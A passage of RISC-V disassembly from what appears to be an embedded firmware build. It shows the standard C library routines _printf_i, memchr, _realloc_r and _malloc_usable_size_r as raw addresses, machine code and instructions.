80006c54:	20070813          	addi	a6,a4,512 # 80008200 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80008201>
80006c58:	1407d363          	bgez	a5,80006d9e <_printf_i+0x1de>
80006c5c:	02d00713          	li	a4,45
80006c60:	04e401a3          	sb	a4,67(s0)
80006c64:	c40c                	sw	a1,8(s0)
80006c66:	0205dc63          	bgez	a1,80006c9e <_printf_i+0xde>
80006c6a:	40f007b3          	neg	a5,a5
80006c6e:	4729                	li	a4,10
80006c70:	8ab6                	mv	s5,a3
80006c72:	02e7f633          	remu	a2,a5,a4
80006c76:	1afd                	addi	s5,s5,-1
80006c78:	9642                	add	a2,a2,a6
80006c7a:	00064603          	lbu	a2,0(a2)
80006c7e:	00ca8023          	sb	a2,0(s5)
80006c82:	863e                	mv	a2,a5
80006c84:	02e7d7b3          	divu	a5,a5,a4
80006c88:	fee675e3          	bgeu	a2,a4,80006c72 <_printf_i+0xb2>
80006c8c:	a08d                	j	80006cee <_printf_i+0x12e>
80006c8e:	439c                	lw	a5,0(a5)
80006c90:	04067513          	andi	a0,a2,64
80006c94:	c30c                	sw	a1,0(a4)
80006c96:	dd45                	beqz	a0,80006c4e <_printf_i+0x8e>
80006c98:	07c2                	slli	a5,a5,0x10
80006c9a:	87c1                	srai	a5,a5,0x10
80006c9c:	bf4d                	j	80006c4e <_printf_i+0x8e>
80006c9e:	9a6d                	andi	a2,a2,-5
80006ca0:	c010                	sw	a2,0(s0)
80006ca2:	b7e1                	j	80006c6a <_printf_i+0xaa>
80006ca4:	4190                	lw	a2,0(a1)
80006ca6:	431c                	lw	a5,0(a4)
80006ca8:	08067513          	andi	a0,a2,128
80006cac:	00478593          	addi	a1,a5,4
80006cb0:	c501                	beqz	a0,80006cb8 <_printf_i+0xf8>
80006cb2:	c30c                	sw	a1,0(a4)
80006cb4:	439c                	lw	a5,0(a5)
80006cb6:	a039                	j	80006cc4 <_printf_i+0x104>
80006cb8:	04067613          	andi	a2,a2,64
80006cbc:	c30c                	sw	a1,0(a4)
80006cbe:	da7d                	beqz	a2,80006cb4 <_printf_i+0xf4>
80006cc0:	0007d783          	lhu	a5,0(a5)
80006cc4:	80008837          	lui	a6,0x80008
80006cc8:	06f00713          	li	a4,111
80006ccc:	20080813          	addi	a6,a6,512 # 80008200 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80008201>
80006cd0:	0ce89563          	bne	a7,a4,80006d9a <_printf_i+0x1da>
80006cd4:	4721                	li	a4,8
80006cd6:	040401a3          	sb	zero,67(s0)
80006cda:	4050                	lw	a2,4(s0)
80006cdc:	c410                	sw	a2,8(s0)
80006cde:	f80649e3          	bltz	a2,80006c70 <_printf_i+0xb0>
80006ce2:	400c                	lw	a1,0(s0)
80006ce4:	99ed                	andi	a1,a1,-5
80006ce6:	c00c                	sw	a1,0(s0)
80006ce8:	f7c1                	bnez	a5,80006c70 <_printf_i+0xb0>
80006cea:	8ab6                	mv	s5,a3
80006cec:	f251                	bnez	a2,80006c70 <_printf_i+0xb0>
80006cee:	47a1                	li	a5,8
80006cf0:	00f71e63          	bne	a4,a5,80006d0c <_printf_i+0x14c>
80006cf4:	401c                	lw	a5,0(s0)
80006cf6:	8b85                	andi	a5,a5,1
80006cf8:	cb91                	beqz	a5,80006d0c <_printf_i+0x14c>
80006cfa:	4058                	lw	a4,4(s0)
80006cfc:	481c                	lw	a5,16(s0)
80006cfe:	00e7c763          	blt	a5,a4,80006d0c <_printf_i+0x14c>
80006d02:	03000793          	li	a5,48
80006d06:	fefa8fa3          	sb	a5,-1(s5)
80006d0a:	1afd                	addi	s5,s5,-1
80006d0c:	415686b3          	sub	a3,a3,s5
80006d10:	c814                	sw	a3,16(s0)
80006d12:	874e                	mv	a4,s3
80006d14:	86ca                	mv	a3,s2
80006d16:	0070                	addi	a2,sp,12
80006d18:	85a2                	mv	a1,s0
80006d1a:	8526                	mv	a0,s1
80006d1c:	d95ff0ef          	jal	ra,80006ab0 <_printf_common>
80006d20:	5a7d                	li	s4,-1
80006d22:	0d451d63          	bne	a0,s4,80006dfc <_printf_i+0x23c>
80006d26:	557d                	li	a0,-1
80006d28:	50b2                	lw	ra,44(sp)
80006d2a:	5422                	lw	s0,40(sp)
80006d2c:	5492                	lw	s1,36(sp)
80006d2e:	5902                	lw	s2,32(sp)
80006d30:	49f2                	lw	s3,28(sp)
80006d32:	4a62                	lw	s4,24(sp)
80006d34:	4ad2                	lw	s5,20(sp)
80006d36:	4b42                	lw	s6,16(sp)
80006d38:	6145                	addi	sp,sp,48
80006d3a:	8082                	ret
80006d3c:	419c                	lw	a5,0(a1)
80006d3e:	0207e793          	ori	a5,a5,32
80006d42:	c19c                	sw	a5,0(a1)
80006d44:	80008837          	lui	a6,0x80008
80006d48:	07800893          	li	a7,120
80006d4c:	21480813          	addi	a6,a6,532 # 80008214 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80008215>
80006d50:	4010                	lw	a2,0(s0)
80006d52:	051402a3          	sb	a7,69(s0)
80006d56:	431c                	lw	a5,0(a4)
80006d58:	08067513          	andi	a0,a2,128
80006d5c:	00478593          	addi	a1,a5,4
80006d60:	c909                	beqz	a0,80006d72 <_printf_i+0x1b2>
80006d62:	c30c                	sw	a1,0(a4)
80006d64:	439c                	lw	a5,0(a5)
80006d66:	a821                	j	80006d7e <_printf_i+0x1be>
80006d68:	80008837          	lui	a6,0x80008
80006d6c:	20080813          	addi	a6,a6,512 # 80008200 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80008201>
80006d70:	b7c5                	j	80006d50 <_printf_i+0x190>
80006d72:	04067513          	andi	a0,a2,64
80006d76:	c30c                	sw	a1,0(a4)
80006d78:	d575                	beqz	a0,80006d64 <_printf_i+0x1a4>
80006d7a:	0007d783          	lhu	a5,0(a5)
80006d7e:	00167713          	andi	a4,a2,1
80006d82:	c701                	beqz	a4,80006d8a <_printf_i+0x1ca>
80006d84:	02066613          	ori	a2,a2,32
80006d88:	c010                	sw	a2,0(s0)
80006d8a:	c399                	beqz	a5,80006d90 <_printf_i+0x1d0>
80006d8c:	4741                	li	a4,16
80006d8e:	b7a1                	j	80006cd6 <_printf_i+0x116>
80006d90:	4018                	lw	a4,0(s0)
80006d92:	fdf77713          	andi	a4,a4,-33
80006d96:	c018                	sw	a4,0(s0)
80006d98:	bfd5                	j	80006d8c <_printf_i+0x1cc>
80006d9a:	4729                	li	a4,10
80006d9c:	bf2d                	j	80006cd6 <_printf_i+0x116>
80006d9e:	20070813          	addi	a6,a4,512
80006da2:	4729                	li	a4,10
80006da4:	bf1d                	j	80006cda <_printf_i+0x11a>
80006da6:	4190                	lw	a2,0(a1)
80006da8:	431c                	lw	a5,0(a4)
80006daa:	49cc                	lw	a1,20(a1)
80006dac:	08067813          	andi	a6,a2,128
80006db0:	00478513          	addi	a0,a5,4
80006db4:	00080663          	beqz	a6,80006dc0 <_printf_i+0x200>
80006db8:	c308                	sw	a0,0(a4)
80006dba:	439c                	lw	a5,0(a5)
80006dbc:	c38c                	sw	a1,0(a5)
80006dbe:	a801                	j	80006dce <_printf_i+0x20e>
80006dc0:	c308                	sw	a0,0(a4)
80006dc2:	04067613          	andi	a2,a2,64
80006dc6:	439c                	lw	a5,0(a5)
80006dc8:	da75                	beqz	a2,80006dbc <_printf_i+0x1fc>
80006dca:	00b79023          	sh	a1,0(a5)
80006dce:	00042823          	sw	zero,16(s0)
80006dd2:	8ab6                	mv	s5,a3
80006dd4:	bf3d                	j	80006d12 <_printf_i+0x152>
80006dd6:	431c                	lw	a5,0(a4)
80006dd8:	41d0                	lw	a2,4(a1)
80006dda:	4581                	li	a1,0
80006ddc:	00478693          	addi	a3,a5,4
80006de0:	c314                	sw	a3,0(a4)
80006de2:	0007aa83          	lw	s5,0(a5)
80006de6:	8556                	mv	a0,s5
80006de8:	28a9                	jal	80006e42 <memchr>
80006dea:	c501                	beqz	a0,80006df2 <_printf_i+0x232>
80006dec:	41550533          	sub	a0,a0,s5
80006df0:	c048                	sw	a0,4(s0)
80006df2:	405c                	lw	a5,4(s0)
80006df4:	c81c                	sw	a5,16(s0)
80006df6:	040401a3          	sb	zero,67(s0)
80006dfa:	bf21                	j	80006d12 <_printf_i+0x152>
80006dfc:	4814                	lw	a3,16(s0)
80006dfe:	8656                	mv	a2,s5
80006e00:	85ca                	mv	a1,s2
80006e02:	8526                	mv	a0,s1
80006e04:	9982                	jalr	s3
80006e06:	f34500e3          	beq	a0,s4,80006d26 <_printf_i+0x166>
80006e0a:	401c                	lw	a5,0(s0)
80006e0c:	8b89                	andi	a5,a5,2
80006e0e:	e78d                	bnez	a5,80006e38 <_printf_i+0x278>
80006e10:	47b2                	lw	a5,12(sp)
80006e12:	4448                	lw	a0,12(s0)
80006e14:	f0f55ae3          	bge	a0,a5,80006d28 <_printf_i+0x168>
80006e18:	853e                	mv	a0,a5
80006e1a:	b739                	j	80006d28 <_printf_i+0x168>
80006e1c:	4685                	li	a3,1
80006e1e:	8656                	mv	a2,s5
80006e20:	85ca                	mv	a1,s2
80006e22:	8526                	mv	a0,s1
80006e24:	9982                	jalr	s3
80006e26:	f16500e3          	beq	a0,s6,80006d26 <_printf_i+0x166>
80006e2a:	0a05                	addi	s4,s4,1
80006e2c:	445c                	lw	a5,12(s0)
80006e2e:	4732                	lw	a4,12(sp)
80006e30:	8f99                	sub	a5,a5,a4
80006e32:	fefa45e3          	blt	s4,a5,80006e1c <_printf_i+0x25c>
80006e36:	bfe9                	j	80006e10 <_printf_i+0x250>
80006e38:	4a01                	li	s4,0
80006e3a:	01940a93          	addi	s5,s0,25
80006e3e:	5b7d                	li	s6,-1
80006e40:	b7f5                	j	80006e2c <_printf_i+0x26c>

80006e42 <memchr>:
80006e42:	0ff5f593          	zext.b	a1,a1
80006e46:	962a                	add	a2,a2,a0
80006e48:	00c51463          	bne	a0,a2,80006e50 <memchr+0xe>
80006e4c:	4501                	li	a0,0
80006e4e:	8082                	ret
80006e50:	00054783          	lbu	a5,0(a0)
80006e54:	feb78de3          	beq	a5,a1,80006e4e <memchr+0xc>
80006e58:	0505                	addi	a0,a0,1
80006e5a:	b7fd                	j	80006e48 <memchr+0x6>

80006e5c <_realloc_r>:
80006e5c:	1101                	addi	sp,sp,-32
80006e5e:	ca26                	sw	s1,20(sp)
80006e60:	ce06                	sw	ra,28(sp)
80006e62:	cc22                	sw	s0,24(sp)
80006e64:	c84a                	sw	s2,16(sp)
80006e66:	c64e                	sw	s3,12(sp)
80006e68:	84b2                	mv	s1,a2
80006e6a:	e991                	bnez	a1,80006e7e <_realloc_r+0x22>
80006e6c:	4462                	lw	s0,24(sp)
80006e6e:	40f2                	lw	ra,28(sp)
80006e70:	44d2                	lw	s1,20(sp)
80006e72:	4942                	lw	s2,16(sp)
80006e74:	49b2                	lw	s3,12(sp)
80006e76:	85b2                	mv	a1,a2
80006e78:	6105                	addi	sp,sp,32
80006e7a:	cb8ff06f          	j	80006332 <_malloc_r>
80006e7e:	ee01                	bnez	a2,80006e96 <_realloc_r+0x3a>
80006e80:	c10ff0ef          	jal	ra,80006290 <_free_r>
80006e84:	4401                	li	s0,0
80006e86:	40f2                	lw	ra,28(sp)
80006e88:	8522                	mv	a0,s0
80006e8a:	4462                	lw	s0,24(sp)
80006e8c:	44d2                	lw	s1,20(sp)
80006e8e:	4942                	lw	s2,16(sp)
80006e90:	49b2                	lw	s3,12(sp)
80006e92:	6105                	addi	sp,sp,32
80006e94:	8082                	ret
80006e96:	89aa                	mv	s3,a0
80006e98:	842e                	mv	s0,a1
80006e9a:	201d                	jal	80006ec0 <_malloc_usable_size_r>
80006e9c:	fe9575e3          	bgeu	a0,s1,80006e86 <_realloc_r+0x2a>
80006ea0:	85a6                	mv	a1,s1
80006ea2:	854e                	mv	a0,s3
80006ea4:	c8eff0ef          	jal	ra,80006332 <_malloc_r>
80006ea8:	892a                	mv	s2,a0
80006eaa:	dd69                	beqz	a0,80006e84 <_realloc_r+0x28>
80006eac:	85a2                	mv	a1,s0
80006eae:	8626                	mv	a2,s1
80006eb0:	93ff90ef          	jal	ra,800007ee <memcpy>
80006eb4:	85a2                	mv	a1,s0
80006eb6:	854e                	mv	a0,s3
80006eb8:	bd8ff0ef          	jal	ra,80006290 <_free_r>
80006ebc:	844a                	mv	s0,s2
80006ebe:	b7e1                	j	80006e86 <_realloc_r+0x2a>

80006ec0 <_malloc_usable_size_r>:
80006ec0:	ffc5a783          	lw	a5,-4(a1)
80006ec4:	ffc78513          	addi	a0,a5,-4
80006ec8:	0007d563          	bgez	a5,80006ed2 <_malloc_usable_size_r+0x12>
80006ecc:	95aa                	add	a1,a1,a0
80006ece:	419c                	lw	a5,0(a1)
80006ed0:	953e                	add	a0,a0,a5
80006ed2:	8082                	ret
